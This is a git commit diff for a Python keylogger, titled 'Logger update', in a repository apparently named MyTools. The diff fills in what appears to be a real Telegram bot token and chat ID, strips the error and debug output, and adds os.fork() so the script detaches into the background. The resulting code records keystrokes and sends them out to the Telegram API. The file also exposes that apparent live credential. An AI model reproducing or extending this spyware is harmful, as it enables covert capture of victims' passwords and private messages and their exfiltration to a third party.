5c230449c9c294966b9924482e1b81b17b921a9a
SaadInHack <muslimdasturchi@gmail.com>
2024-08-01 14:40:56 +0500

    Logger update

--- MyTools/keylogger/logger.py
+++ MyTools/keylogger/logger.py
@@ -1,8 +1,10 @@
+import subprocess
+import os
 from pynput import keyboard
 import requests
 
-TELEGRAM_TOKEN = 'bot-token'
-CHAT_ID = 'chatid'
+TELEGRAM_TOKEN = '7487368327:AAG3qLN8GXhb1thhE0brlWgcisIDtFwnick'
+CHAT_ID = '1174153911'
 TELEGRAM_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
 
 buffer = []
@@ -13,15 +15,14 @@ def send_to_telegram(message):
         'chat_id': CHAT_ID,
         'text': message
     }
-    print(f"Sending message: {message}")  # Debug message
     try:
         response = requests.post(TELEGRAM_URL, data=payload)
         if response.status_code != 200:
-            print(f'Error: {response.status_code} - {response.text}')
+            a = 3
         else:
-            print("Message sent successfully")
+            a = 1
     except Exception as e:
-        print(f'Failed to send message. Error: {e}')
+            a = 2
 
 def on_press(key):
     global buffer
@@ -41,6 +42,15 @@ def on_press(key):
     else:
         print("Special key pressed or non-printable character.")
 
-with keyboard.Listener(on_press=on_press) as listener:
-    print("Listening for key presses...")
-    listener.join()
+def start_listener():
+    with keyboard.Listener(on_press=on_press) as listener:
+        print("Listening for key presses...")
+        listener.join()
+
+if __name__ == "__main__":
+    # Check if the script is already running in the background
+    if os.fork() > 0:
+        # Exit the parent process
+        exit()
+    # Start the listener in the child process
+    start_listener()
